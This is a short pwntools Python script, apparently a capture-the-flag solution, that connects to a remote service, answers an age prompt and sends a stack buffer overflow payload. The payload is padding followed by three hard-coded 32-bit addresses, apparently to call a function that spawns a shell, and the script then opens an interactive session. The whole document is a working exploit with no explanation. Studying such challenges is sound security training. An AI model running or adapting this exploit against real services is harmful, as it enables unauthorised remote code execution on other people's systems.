from pwn import *
# remote()建立远程连接,指明ip和port
p = remote('0.0.0.0',46315)
context.log_level='debug'
p.sendlineafter("What's your age?",b'200')
payload=(0x58+4)*b'a'+p32(0x08049070)+p32(0x08049213)+p32(0x0804C02C)
p.sendlineafter(b"Now..try to overflow!",payload)
p.interactive()